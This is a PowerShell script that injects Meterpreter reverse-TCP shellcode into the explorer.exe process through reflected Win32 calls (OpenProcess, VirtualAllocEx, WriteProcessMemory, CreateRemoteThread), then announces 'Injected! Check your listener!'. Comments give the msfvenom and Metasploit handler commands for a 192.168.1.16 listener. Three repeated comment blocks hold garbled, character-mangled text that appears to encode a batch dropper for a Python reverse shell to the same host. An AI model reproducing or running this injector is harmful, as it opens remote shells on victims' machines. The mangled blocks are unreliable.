<#
start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
yÈh @yÈh off > ([µÛ]£.bat
yÈh cd %µé©% >> ([µÛ]£.bat
yÈh :) >> ([µÛ]£.bat
yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    {¦ 
çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
#>
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
<#
start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
yÈh @yÈh off > ([µÛ]£.bat
yÈh cd %µé©% >> ([µÛ]£.bat
yÈh :) >> ([µÛ]£.bat
yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    {¦ 
çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
#>
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$procId = (Get-Process explorer).Id
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=5555 -f ps1   
# to avoid dicconnectiong while receiving new connection :
# msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z"
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x44,0x8b,0x40,0x20,0x8b,0x48,0x18,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x15,0xb3,0xc0,0xa8,0x1,0x10,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x6a,0xa,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0xa,0x49,0xff,0xce,0x75,0xe5,0xe8,0x93,0x0,0x0,0x0,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x4,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,0x59,0x68,0x0,0x10,0x0,0x0,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x2,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x0,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x0,0x40,0x0,0x0,0x41,0x58,0x6a,0x0,0x5a,0x41,0xba,0xb,0x2f,0xf,0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x1,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5

$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),
  (getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)
<#
start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
yÈh @yÈh off > ([µÛ]£.bat
yÈh cd %µé©% >> ([µÛ]£.bat
yÈh :) >> ([µÛ]£.bat
yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    {¦ 
çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
#>
$expAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), 
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)

$procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), 
  (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $expAddr, $buf, [Uint32]$buf.Length, [IntPtr]::Zero)         

  [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread),
  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $expAddr, 0, [IntPtr]::Zero)

Write-Host "Injected! Check your listener!"
